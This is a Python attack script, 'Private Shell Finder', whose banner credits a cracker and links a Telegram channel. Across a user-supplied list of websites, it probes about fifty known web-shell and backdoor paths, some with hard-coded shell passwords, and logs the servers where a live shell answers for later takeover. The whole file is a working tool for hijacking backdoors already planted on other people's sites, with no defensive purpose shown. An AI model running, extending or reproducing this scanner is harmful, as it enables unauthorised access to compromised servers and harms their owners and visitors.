import requests
import os
from colorama import Fore, Back, Style, init
from concurrent.futures import ThreadPoolExecutor
import threading

lock = threading.Lock()
init(autoreset=True)

try:
    os.system('title Private Shell Finder 2022')
except:
    pass

uagent = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36' }

try:
    os.mkdir('Result')
except:
    pass


os.system('cls' if os.name == 'nt' else 'clear')
merah = Fore.RED
blue = Fore.BLUE
hijau = Fore.GREEN
cyan = Fore.CYAN
kuning = Fore.YELLOW
reset = Fore.RESET
putih = 
Fore.WHITE

def cm5(urll):
    try:
        with lock:
            urll = urll.replace('\n', '').replace('\r', '').replace('https://', '').replace('http://', '')
            op = requests.get('http://' + urll + '/about.php', timeout=10)
            op1 = requests.get('http://' + urll + '/upload.php?mr=exe3', timeout=10)
            op2 = requests.get('http://' + urll + '/2index.php', timeout=10)
            op3 = requests.get('http://' + urll + '/C.php', timeout=10)
            op4 = requests.get('http://' + urll + '/c.php', timeout=10)
            op5 = requests.get('http://' + urll + '/01.php', timeout=10)
            op6 = requests.get('http://' + urll + '/1.php', timeout=10)
            op7 = requests.get('http://' + urll + '/02.php', timeout=10)
            op8 = requests.get('http://' + urll + '/wp.php', timeout=10)
            op9 = requests.get('http://' + urll + '/fw.php', timeout=10)
            op10 = requests.get('http://' + urll + '/alfa.php', timeout=10)
            op11 = requests.get('http://' + urll + '/mini.php', timeout=10)
            op12 = requests.get('http://' + urll + '/x.php', timeout=10)
            op13 = requests.get('http://' + urll + '/404.php', timeout=10)
            op14 = requests.get('http://' + urll + '/403.php', timeout=10)
            op15 = requests.get('http://' + urll + '/wso.php', timeout=10)
            op16 = requests.get('http://' + urll + '/admin.php', timeout=10)
            op17 = requests.get('http://' + urll + '/wp-22.php', timeout=10)
            op18 = requests.get('http://' + urll + '/1index.php', timeout=10)
            op19 = requests.get('http://' + urll + '/marijuana.php', timeout=10)
            op20 = requests.get('http://' + urll + '/good.php', timeout=10)
            op21 = requests.get('http://' + urll + '/up.php', timeout=10)
            op22 = requests.get('http://' + urll + '/doc.php', timeout=10)
            op23 = requests.get('http://' + urll + '/wp-content/themes/wp-pridmag/init.php', timeout=10)
            op24 = requests.get('http://' + urll + '/wp.php', timeout=10)
            op25 = requests.get('http://' + urll + '/radio.php', timeout=10)
            op26 = requests.get('http://' + urll + '/wp-includes/1index.php?pass=am*guAW8.ryDgz-TYF', timeout=10)
            op27 = requests.get('http://' + urll + '/1index.php?pass=am*guAW8.ryDgz-TYF', timeout=10)
            op28 = requests.get('http://' + urll + '/wp_wrong_datlib.php?pass=stusa', timeout=10)
            op29 = requests.get('http://' + urll + '/2index.php?pass=am*guAW8.ryDgz-TYF', timeout=10)
            op30 = requests.get('http://' + urll + '/autoload_classmap.php', timeout=10)
            op31 = requests.get('http://' + urll + '/wp.php', timeout=10)
            op32 = requests.get('http://' + urll + '/wikindex.php', timeout=10)
            op33 = requests.get('http://' + urll + '/Deadcode1975xxxxxxxxxxxxxxxxxxxxxxxxxxxx.php', timeout=10)
            op34 = requests.get('http://' + urll + '/wp-2019.php', timeout=10)
            op35 = requests.get('http://' + urll + '/1h6j5.php', timeout=10)
            op36 = requests.get('http://' + urll + '/wp-admin/setup-config.php', timeout=10)
            op37 = requests.get('http://' + urll + '/wp-admin/xleet.php', timeout=10)
            op38 = requests.get('http://' + urll + '/wp-content/fw.php', timeout=10)
            op39 = requests.get('http://' + urll + '/wp-admin/fx.php', timeout=10)
            op40 = requests.get('http://' + urll + '/4price.php', timeout=10)
            op41 = requests.get('http://' + urll + '/wp-info.php', timeout=10)
            op42 = requests.get('http://' + urll + '/utchiha.php', timeout=10)
            op43 = requests.get('http://' + urll + '/wp-admin/priv8.php', timeout=10)
            op44 = requests.get('http://' + urll + '/wp-admin/rss.php', timeout=10)
            op45 = requests.get('http://' + urll + '/uploads/xleet.php', timeout=10)
            op46 = requests.get('http://' + urll + '/ALFA_DATA/alfacgiapi', timeout=10)
            op47 = requests.get('http://' + urll + '/wp-admin/Fox-C', timeout=10)
            op48 = requests.get('http://' + urll + '/wp-admin/Fox-C404', timeout=10)
            op49 = requests.get('http://' + urll + '/Fox-C40', timeout=10)
            op50 = requests.get('http://' + urll + '/wp-admin/ALFA_DATA/alfacgiapi/', timeout=10)
            op51 = requests.get('http://' + urll + '/wp-admin/Panels.txt', timeout=10)
            op52 = requests.get('http://' + urll + '/Panels.txt/', timeout=10)
            if 'drwxr-xr-x' in op.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/about.php\n')

            if 'drwxr-xr-x' in op1.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Exploit ( Sukses Upload) ' + reset)
                open('Result/Exploit.txt', 'a').write('http://' + urll + '/upload.php?mr=exe3\n')

            if 'drwxr-xr-x' in op2.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/2index.php\n')

            if 'drwxr-xr-x' in op3.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/C.php\n')

            if 'drwxr-xr-x' in op4.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/c.php\n')

            if 'drwxr-xr-x' in op5.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/01.php\n')

            if 'drwxr-xr-x' in op6.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/1.php\n')

            if 'drwxr-xr-x' in op7.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/02.php\n')

            if 'drwxr-xr-x' in op8.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wp.php\n')

            if 'drwxr-xr-x' in op9.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Wso-Shells.txt', 'a').write('http://' + urll + '/fw.php\n')

            if 'drwxr-xr-x' in op10.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Alfa-Shells.txt', 'a').write('http://' + urll + '/alfa.php\n')

            if 'drwxr-xr-x' in op11.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/mini.php\n')

            if 'drwxr-xr-x' in op12.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/x.php\n')

            if 'drwxr-xr-x' in op13.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/404.php\n')

            if 'drwxr-xr-x' in op14.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/403.php\n')

            if 'drwxr-xr-x' in op15.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Wso-Shells.txt', 'a').write('http://' + urll + '/wso.php\n')

            if 'drwxr-xr-x' in op16.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/admin.php\n')

            if 'drwxr-xr-x' in op17.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wp-22.php\n')

            if 'drwxr-xr-x' in op18.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/1index.php\n')

            if 'drwxr-xr-x' in op19.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Marijuana-Shells.txt', 'a').write('http://' + urll + '/marijuana.php\n')

            if 'drwxr-xr-x' in op20.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/good.php\n')

            if 'drwxr-xr-x' in op21.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/up.php\n')

            if 'drwxr-xr-x' in op22.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/doc.php\n')

            if 'SMP' in op23.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wp-content/themes/wp-pridmag/init.php\n')

            if 'drwxr-xr-x' in op24.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wp.php\n')

            if 'drwxr-xr-x' in op25.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/radio.php\n')

            if 'drwxr-xr-x' in op26.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wp-includes/1index.php?pass=am*guAW8.ryDgz-TYFp\n')

            if 'drwxr-xr-x' in op27.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/1index.php?pass=am*guAW8.ryDgz-TYFp\n')

            if 'drwxr-xr-x' in op28.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wp_wrong_datlib.php?pass=stusa\n')

            if 'drwxr-xr-x' in op29.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/2index.php?pass=am*guAW8.ryDgz-TYFp\n')

            if 'drwxr-xr-x' in op30.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/autoload_classmap.php\n')

            if 'drwxr-xr-x' in op31.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wp.php\n')

            if 'drwxr-xr-x' in op32.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wikindex.php\n')

            if 'drwxr-xr-x' in op33.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/Deadcode1975xxxxxxxxxxxxxxxxxxxxxxxxxxxx.php\n')

            if 'drwxr-xr-x' in op34.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wp-2019\n')

            if 'drwxr-xr-x' in op35.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/1h6j5.php\n')

            if 'drwxr-xr-x' in op36.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wp-admin/setup-config.php\n')

            if 'drwxr-xr-x' in op37.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wp-admin/xleet.php\n')

            if 'drwxr-xr-x' in op38.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wp-admin/fw.php\n')

            if 'drwxr-xr-x' in op39.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wp-admin/fx.php\n')

            if 'drwxr-xr-x' in op40.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/4price.php\n')

            if 'drwxr-xr-x' in op41.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wp-info.php\n')

            if 'drwxr-xr-x' in op42.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/utchiha.php\n')

            if 'drwxr-xr-x' in op43.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wp-admin/priv8.php\n')

            if 'drwxr-xr-x' in op44.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/wp-admin/priv8.php\n')

            if 'drwxr-xr-x' in op45.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Shel ( Scan Shell ) ' + reset)
                open('Result/Shells.txt', 'a').write('http://' + urll + '/uploads/xleet.php\n')

            if 'drwxr-xr-x' in op46.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Rce ( Scan DATA ) ' + reset)
                open('Result/RCE-ALFA.txt', 'a').write('http://' + urll + '/ALFA_DATA/alfacgiapi/\n')

            if 'drwxr-xr-x' in op47.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Confige ( Scan Work ) ' + reset)
                open('Result/Confige-Fox.txt', 'a').write('http://' + urll + '/wp-admin/Fox-C\n')

            if 'drwxr-xr-x' in op48.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Confige ( Scan work ) ' + reset)
                open('Result/Confige-Fox.txt', 'a').write('http://' + urll + '/wp-admin/Fox-C404\n')

            if 'drwxr-xr-x' in op49.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Confige ( Scan work ) ' + reset)
                open('Result/Confige-Fox.txt', 'a').write('http://' + urll + '/wp-admin/Fox-C404\n')

            if 'drwxr-xr-x' in op50.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Confige ( Scan work ) ' + reset)
                open('Result/RCE-ALFA.Atxt', 'a').write('http://' + urll + '/wp-admin/ALFA_DATA/alfacgiapi/\n')

            if 'drwxr-xr-x' in op51.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found 0Day ( Scan work ) ' + reset)
                open('Result/Panels.txt', 'a').write('http://' + urll + '/wp-admin/Panels.txt\n')

            if 'drwxr-xr-x' in op52.text:
                print(kuning + '-|' + putih + ' http://' + urll + blue + ' Wait...==>>  ' + hijau + ' Found Rce ( Scan DATA ) ' + reset)
                open('Result/Panels.txt', 'a').write('http://' + urll + '/wp-admin/Panels.txt/\n')

            print(merah + '[' + kuning + '+' + merah + '] ' + putih + 'http://' + urll + blue + ' Wait...==>> ' + hijau + ' Found Exploit ' + merah + '  +Not Upload+  ' + reset)
    except:
        with lock:
            print(merah + '[' + kuning + '+' + merah + '] ' + putih + 'http://' + urll + blue + ' Wait...==>> ' + merah + ' Unknown  ' + kuning + ' =BAD= ' + reset)



print('''{0}--    ______          ______        ________        __     __  ________ 
--   /      \\        /      \\      /        |      /  |   /  |/        |
--  /$$$$$$  |      /$$$$$$  |     $$$$$$$$/       $$ |   $$ |$$$$$$$$/ 
--  $$ |__$$ |      $$ | _$$/         $$ |         $$ |   $$ |    /$$/  
--  $$    $$ |      $$ |/    |        $$ |         $$  \\ /$$/    /$$/   
--  $$$$$$$$ |      $$ |$$$$ |        $$ |          $$  /$$/    /$$/    
--  $$ |  $$ |      $$ \\__$$ |        $$ |           $$ $$/    /$$/     
--  $$ |  $$ |      $$    $$/         $$ |            $$$/    /$$/      
--  $$/   $$/        $$$$$$/          $$/              $/     $$/       
--  {1}Cracked And Cleaned By {0}@killo_trojanz{1} | Join: {0}http://t.me/xploitpriv
'''.format(merah, blue))

site = input(hijau + '[+] Input List: ')
thrd = int(input(kuning + '[+] Thread: '))
print('')
urll = open(site, 'r').read().splitlines()
with ThreadPoolExecutor(thrd) as executor:
    executor.map(cm5, urll)
